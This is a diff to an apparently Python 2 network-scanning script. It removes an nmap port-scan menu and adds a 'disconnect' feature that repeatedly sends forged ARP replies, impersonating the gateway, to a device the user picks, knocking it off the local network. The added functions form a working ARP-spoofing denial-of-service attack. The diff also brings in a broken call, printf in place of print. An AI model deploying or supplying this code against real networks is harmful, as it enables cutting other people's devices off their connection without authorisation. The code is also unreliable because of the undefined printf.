@@ -84,26 +84,6 @@ def scanNetwork(network):
                 pass
 
     return returnList
-    
-
-def openPorts() : 
-	import nmap
-	nm = nmap.PortScanner()
-	for host in nodelist :
-		try:
-			a = nm.scan(hosts=host[0])
-			print('{0}open Tcp ports for ip {1}'+host[0]+'{2} are {3}'+str(nm[host[0]].all_tcp())).format(YELLOW,RED,YELLOW,END)
-			
-			print('{0}open udp ports for ip {1}'+host[0]+'{2} are {3}'+str(nm[host[0]].all_udp())).format(YELLOW,RED,YELLOW,END)
-
-		except:
-			continue
-		
-	for host in nodelist :
-		a =  nm.scan(hosts=host[0],arguments= '')
-		print('{0}services for ip {1} '+host[0]+'{2} are {3}'+ a['nmap']['scaninfo']['tcp']['services']+'{4}').format(YELLOW,RED,YELLOW,BLUE,END)
-		
-	
 
 def getNodes():
     global nodelist
@@ -111,7 +91,7 @@ def getNodes():
         nodelist = scanNetwork(getDefaultInterface(True))
         #print('nodes ********************',nodelist)
     except KeyboardInterrupt:
-        print("Terminated.")
+        printf("Terminated.")
     except:
         print("Error.")
     generateIPs()
@@ -143,7 +123,50 @@ def display():
 	    	vendor = resolveMac(mac)
 	   	#print(mac)
 	   	print("  [{0}" + str(i) + "{1}] {2}" + str(liveIPs[i]) + "{3}\t" + mac + "{4}\t" + vendor + "{5}").format(YELLOW, WHITE, RED, BLUE, GREEN,END)
+	
+
+def disconnect():
+	choice=raw_input("Choose a node to disconnect from network : ")
+	target_ip = liveIPs[int(choice)]
+	target_mac = nodelist[int(choice)][1]
+	print('disconneting device with ip ' +target_ip+"  and mac " +target_mac)
+	try:
+		while True:
+			sendPacket(defaultInterfaceMac,defaultGatewayIP,target_ip,target_mac)
+			time.sleep(2)
+	except KeyboardInterrupt:
+		count =1
+		while count!=10:
+			sendPacket(defaultInterfaceMac,defaultGatewayIP,target_ip,target_mac)
+			count += 1
+			time.sleep(0.5)
+		print("device disconnected!!")
 		
+		
+
+def sendPacket(my_mac,gateway_ip,target_ip,target_mac):#need to be modify a bit
+	ether = Ether()
+	ether.src = my_mac
+	
+	arp=ARP()
+	arp.psrc = gateway_ip
+	arp.hwsrc = my_mac
+	
+	arp=arp
+	arp.pdst = target_ip
+	arp.hwdst = target_mac
+	
+	ether = ether
+	ether.src = my_mac
+	ether.dst = target_mac
+	
+	arp.op=2
+	
+	packet = ether / arp
+	sendp(x=packet,verbose=False)
+		
+	
+	
 def main():
 	print("{0}Scanning your network, hang on...{1}\r".format(BLUE, END))
 	print("{0}Default Network Interface:{1} " + defaultInterface+'{2}').format(GREEN,RED,END)
@@ -163,18 +186,19 @@ def main():
 	    vendor = resolveMac(mac)
 	    #print(mac)
 	    print("  [{0}" + str(i) + "{1}] {2}" + str(liveIPs[i]) + "{3}\t" + mac + "{4}\t" + vendor + "{5}").format(YELLOW, WHITE, RED, BLUE, GREEN,END)
-	 
-	
-	while True:
-		print('{0}[1]{1} list open ports and services{2}' ).format(YELLOW,WHITE,END)
-		print('{0}[2]{1} Exit{2}').format(YELLOW,WHITE,END)
-		choice = raw_input(' choose your choice : ')
-		if choice == '1':
-			openPorts()
-		else:
-			sys.exit("Exited")
-			
-	
+	    
+	try:
+		while True:
+			if len(nodelist) <=1 :
+				print("Can't kickout")
+				raise SystemExit
+			else:
+				disconnect()
+				raise SystemExit
+				
+				
+	except KeyboardInterrupt:
+		print('error!!')
 		
 				
 if __name__ == '__main__':
